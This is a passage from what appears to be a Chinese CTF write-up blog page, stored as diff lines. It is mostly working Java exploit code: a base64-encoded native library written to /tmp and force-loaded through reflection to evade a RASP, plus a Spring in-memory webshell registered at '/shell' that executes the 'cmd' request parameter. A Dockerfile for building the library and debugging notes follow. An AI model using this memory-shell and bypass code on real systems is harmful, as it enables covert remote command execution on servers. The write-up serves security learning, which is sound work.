AAAAEAAAAAgAAAAgAAAAAAAAAAAAAAAAAAABkAAAABAAAAAIAAAAAAAAAAAUAAAAAAAAABQAAAAAAAMAAAAAAAAAAAwAAAAAAAAAIAAAAAAAAABgAAAAAAAAAbgAAAAQAAABCAAAAAAAAAMAFAAAAAAAAwAUAAAAAAADwAAAAAAAAAAMAAAAUAAAACAAAAAAAAAAYAAAAAAAAAHgAAAABAAAABgAAAAAAAACwBgAAAAAAALAGAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABzAAAAAQAAAAYAAAAAAAAA0AYAAAAAAADQBgAAAAAAAMAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAfgAAAAEAAAAGAAAAAAAAAJAHAAAAAAAAkAcAAAAAAAC0AgAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAIQAAAABAAAABgAAAAAAAABECgAAAAAAAEQKAAAAAAAAFAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACKAAAAAQAAAAIAAAAAAAAAWAoAAAAAAABYCgAAAAAAAAIAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAkgAAAAEAAAACAAAAAAAAAFwKAAAAAAAAXAoAAAAAAAA8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKAAAAABAAAAAgAAAAAAAACYCgAAAAAAAJgKAAAAAAAAxAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACqAAAADgAAAAMAAAAAAAAA2A0BAAAAAADYDQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAtgAAAA8AAAADAAAAAAAAAOANAQAAAAAA4A0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMIAAAAGAAAAAwAAAAAAAADoDQEAAAAAAOgNAAAAAAAA0AEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADLAAAAAQAAAAMAAAAAAAAAuA8BAAAAAAC4DwAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA0AAAAAEAAAADAAAAAAAAAOgPAQAAAAAA6A8AAAAAAABoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANkAAAABAAAAAwAAAAAAAABQEAEAAAAAAFAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADfAAAACAAAAAMAAAAAAAAAWBABAAAAAABYEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA5AAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAWBAAAAAAAAArAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAIgQAAAAAAAAIAcAAAAAAAAZAAAAPgAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACoFwAAAAAAAEUCAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA7RkAAAAAAADtAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==&quot;;
+            String LIB_PATH = &quot;/tmp/libcmd.so&quot;;
+
+            byte[] jniBytes = Base64.getDecoder().decode(Evil_B64);
+            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;);
+            randomAccessFile.write(jniBytes);
+            randomAccessFile.close();
+
+            ClassLoader cmdLoader = EvilClass.class.getClassLoader();
+            Class&lt;?&gt; classLoaderClazz = Class.forName(&quot;java.lang.ClassLoader&quot;);
+            Class&lt;?&gt; nativeLibraryClazz = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;);
+            Method load = nativeLibraryClazz.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class);
+            load.setAccessible(true);
+            Field field = classLoaderClazz.getDeclaredField(&quot;nativeLibraries&quot;);
+            field.setAccessible(true);
+            Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);
+            Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);
+            nativeLibraryCons.setAccessible(true);
+            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false);
+            libs.addElement(nativeLibraryObj);
+            field.set(cmdLoader, libs);
+            load.invoke(nativeLibraryObj, LIB_PATH, false);
+
+            final String controllerPath = &quot;/shell&quot;;
+
+            // 获取当前应用上下文
+            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(
+                    ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()
+            );
+
+            // 通过 context 获取 RequestMappingHandlerMapping 对象
+            RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
+
+            // 获取父类的 MappingRegistry 属性
+            Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;mappingRegistry&quot;);
+            f.setAccessible(true);
+            Object mappingRegistry = f.get(mapping);
+
+            // 反射调用 MappingRegistry 的 register 方法
+            Class&lt;?&gt; c = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&quot;);
+            Method[] ms = c.getDeclaredMethods();
+
+
+            PathPatternsRequestCondition   prc       = new PathPatternsRequestCondition();
+            RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
+
+            Class&lt;?&gt; clazz1 = prc.getClass();
+            Field patternsField = clazz1.getDeclaredField(&quot;patterns&quot;);
+            patternsField.setAccessible(true); // 设置私有字段为可访问
+
+            // 创建新的 SortedSet&lt;PathPattern&gt; 并解析 controllerPath
+            PathPatternParser parser = new PathPatternParser();
+            PathPattern pathPattern = parser.parse(controllerPath);
+            SortedSet&lt;PathPattern&gt; epp = new TreeSet&lt;&gt;(Collections.singleton(pathPattern));
+
+            // 通过反射设置新的值
+            patternsField.set(prc, epp);
+
+            // 设置info的pathPatternsCondition为prc，patternsCondition为null
+            RequestMappingInfo info = new RequestMappingInfo(null, null, condition, null, null, null, null, null);
+            Class&lt;?&gt; clazz2 = info.getClass();
+            Field pathPatternsConditionField = clazz2.getDeclaredField(&quot;pathPatternsCondition&quot;);
+            Field patternsConditionField = clazz2.getDeclaredField(&quot;patternsCondition&quot;);
+            pathPatternsConditionField.setAccessible(true);
+            patternsConditionField.setAccessible(true);
+
+            pathPatternsConditionField.set(info, prc);
+            patternsConditionField.set(info, null);
+
+            Object evilController = new EvilClass();
+
+            for (Method method : ms) {
+                if (&quot;register&quot;.equals(method.getName())) {
+                    // 反射调用 MappingRegistry 的 register 方法注册 TestController 的 index
+                    method.setAccessible(true);
+                    Method m = evilController.getClass().getDeclaredMethod(&quot;evilFunc&quot;, HttpServletRequest.class, HttpServletResponse.class);
+                    method.invoke(mappingRegistry, info, evilController, m);
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void evilFunc(HttpServletRequest req, HttpServletResponse res) throws Exception{
+        String cmd = req.getParameter(&quot;cmd&quot;);
+        if (cmd != null) {
+            String output = EvilClass.execCmd(cmd);
+            PrintWriter out = res.getWriter();
+            out.println(output);
+            out.flush();
+            out.close();
+        }
+    }
+    
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>成功执行命令，后面执行/readflag即可<br>
+<img src="https://skyblu3519.github.io/post-images/1709264753744.png" alt="" loading="lazy"></p>
+<h2 id="ps">PS</h2>
+<p>首先在jar包里面调试，有些方法Find Usage找不出来。而且明明调用了这个方法，打断点也停不了。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264770809.png" alt="" loading="lazy"></p>
+<p>但是直接追踪变量就可以了。具体也不知道什么原因……<br>
+<img src="https://skyblu3519.github.io/post-images/1709264779676.png" alt="" loading="lazy"></p>
+<p>还有就是生成动态连接库，这里的平台要保持统一。这里我整了个gcc+jdk8的docker来生成的</p>
+<pre><code># 基于 Ubuntu 镜像
+FROM ubuntu:latest
+
+# 更新软件包列表
+RUN apt-get update
+
+# 安装 OpenJDK-8-JDK
+RUN apt-get install -y openjdk-8-jdk
+
+# 安装 GCC
+RUN apt-get install -y gcc
+
+# 设置 JAVA_HOME 环境变量
+ENV JAVA_HOME /usr/lib/jvm/java-8-openjdk-arm64
+
+# 清理缓存以减小镜像大小
+RUN apt-get clean
+
+# 验证安装
+RUN java -version
+RUN gcc --version
+</code></pre>
+<h1 id="总结">总结</h1>
+<p>在各种摆烂后，这道去年10月的题到今天终于看完了……</p>
+<p>其中涉及的好多知识点也算慢慢学完了。RASP和JNI我应该是不打算再写篇博客了，以后遇到再说吧～</p>
+<p>RASP的参考链接：<a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83">题目环境</a></li>
+<li><a href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B">解题流程</a>
+<ul>
+<li><a href="#ps">PS</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/birthday-gift/">
+              <h3 class="post-title">
+                birthday gift
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
